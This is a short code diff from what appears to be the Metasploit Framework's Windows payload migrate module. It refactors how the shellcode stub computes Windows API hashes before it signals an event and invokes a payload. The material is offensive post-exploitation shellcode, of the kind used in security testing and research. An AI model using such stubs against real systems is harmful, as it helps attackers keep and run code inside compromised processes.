@@ -18,6 +18,7 @@ module Payload::Windows::MigrateCommon
   # Constructs the migrate stub on the fly
   #
   def generate(opts={})
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     asm = %Q^
     migrate:
       cld
@@ -31,7 +32,7 @@ module Payload::Windows::MigrateCommon
     #{generate_migrate(opts)}
     signal_event:
       push dword [esi]    ; Event handle is pointed at by esi
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
+      push #{block_api_hash('kernel32.dll', 'SetEvent')}
       call ebp            ; SetEvent(handle)
     call_payload:
       call dword [esi+8]  ; Invoke the associated payload
